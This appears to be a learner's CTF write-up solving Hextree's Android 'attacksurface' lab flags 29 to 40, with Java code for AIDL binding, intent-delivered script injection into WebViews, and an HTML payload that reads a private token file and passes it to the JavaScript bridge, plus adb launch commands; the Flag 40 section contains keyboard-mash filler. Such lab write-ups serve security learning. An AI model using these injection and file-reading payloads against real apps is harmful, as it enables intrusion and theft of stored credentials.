![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/2f5db115-c1c8-4b05-a3ce-e90ab04271ac/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=aa30c74f096c1f277d3923a7875d8943a6e5413ebc31e089ff5a58c521b64fe7&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
The above screen shot gives us the order of the function
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/136c664a-888d-4d91-8119-7175b8efcf32/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=050099aa242977bb8134e60baa42f8743c8a2138286e833ba5ee39152dd30a58&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
The above screen shot we can see that we are creating a string and passing that in parcel2.writestring() function which is authenticated by authenticate() function and finally calls sucess if there is no clash
```java
public class flag29 extends AppCompatActivity {
    private IFlag29Interface aidlService;
    private ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            // Convert IBinder into AIDL interface
            aidlService = IFlag29Interface.Stub.asInterface(service);
            try {
                String password = aidlService.init();
                aidlService.authenticate(password);
                aidlService.success();
            } catch (Exception e) { }
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
            aidlService = null;
        }
    };
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag28Service");
        bindService(intent, connection, Context.BIND_AUTO_CREATE);
    }
}
```
We make a IFlag29Interface in the same method we made our IFlag28Interface and give the exact order of the functions 
```java
// IFlag29Interface.aidl
package io.hextree.attacksurface.services;
interface IFlag29Interface {
    String init();
    void authenticate(String str);
    void success();
}
```
<empty-block/>
### Flag 38
There are few apps that can be completely build on html and java script 
The functions that are annotated with **@**JavaScriptInterface allows the java objects methods to be accessed from java script
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/18a021fb-8cd8-4c6d-8683-2c91cfb4ffc1/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=c628832efca4f4ddcc8584f8a2464906cae02f1836ea2fe89f5a1b7c357a00e7&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
as usual we need to call the success function and we can see the app is waiting for an intent which contains a string labelled as URL which is used to load in webview() which we previously created an element webview
In the code we can see that java script is enabled which gives us a large range of attack surface because it contains functions and methods that are needed to be implemented and access to folders in some cases if its set to false and use only standard html the attack range would decrease drastically 
Using the java script we are creating a new object which has 2 methods in which one has success function
Back in Android 4, it was possible to use the JavascriptInterface to access any other Java object and call arbitrary methods. Leading to arbitrary code execution.
But in modern WebView this does not work anymore. Only methods annotated with `@JavascriptInterface` can be accessed.
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/84149051-d8ed-49e7-8b31-511aa33cf548/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=6cac559271ad06ec70041ea0fc5fd7b2592968cf5763b9b1f4c7b5050e9332a0&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
When there is not intent there is a default url path is being loaded which loads he above html file
The above html file is in assets folder of decompiled code which is used for flag38 
There are 2 buttons executing functions since success is set to false
I used data uri’s for this case with content text/html and anything that is after that is a html document and we can even create payloads using scripts in this we set the success function to true and then send it as a intent which loads and calls success function
```java
@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface",
                "io.hextree.attacksurface.webviews.Flag38WebViewsActivity");
        intent.putExtra("URL", "data:text/html,<script>hextree.success(true)</script>");
        startActivity(intent);
    
```
### Flag 39
In this challenge the url is hardcoded so we cannot control the url 
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/89c7ee9c-3010-429e-a7da-649ccf83a5be/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=549e5a0584af88fd4b951915ea9042b082165cffd0f76a161b9696db2c4bafdd&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
As expected the app is expecting an intent labelled as NAME and when its not present the default name is neo
we are creating a json object and there is a function webView.evaluateJavascript() which means there is java script function that is being evaluated there in the webview specifically calls 
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/f977c876-61d3-4f4b-806e-208b3e4db2bd/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=5d3172459481d387d1001967a9ecdfcab22e3612e901ed01843eb82c41e1784f&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
The success method in flag39 is called when the uuid generated in flag39webviews which is passed through intents 
We could pass the name through intents and our name it creates a java object and displays it in html 
In java code they created a bridge for java code to interact with javascript naming its as hextree
so we can interact with it using hextree.javascriptfunction()
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/43696c57-ab32-49b9-a1d7-2ff13b831f89/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=38593c7c7681595f45e47c3f9c8234008e6d1003e85f0979d7ff1c9f360cd4cf&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
so we create an intent which has a javascript function success 
since we can mangle with intent which reads name we make a intent which contains the
 `</b><script>hextree.success()</script>`  where the java script function is mentioned in script tags and \</b\>  closes the object name tag and executes ours  
<empty-block/>
### Flag40
hsdgh
<empty-block/>
sdsk
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/40c47c72-dd76-48e5-bc22-079da869118b/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=324807af1a4a5d564444b7e82488828686952a2341996dd324108224926456c2&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
asjahjsj
```java
<html>
<body>
    <script>
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "file:///data/data/io.hextree.attacksurface/files/token.txt", true);
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) {
                var token = xhr.responseText.trim();
                hextree.authCallback(token);
            }
        };
        xhr.send();
    </script>
</body>
</html>
```
shsdsjh
`adb push attack.html /sdcard/attack.html`
ashasnjds
`adb shell am start -n io.hextree.attacksurface/io.hextree.attacksurface.webviews.Flag40WebViewsActivity \<br>--es "URL" "file:///sdcard/attack.html"`
<empty-block/>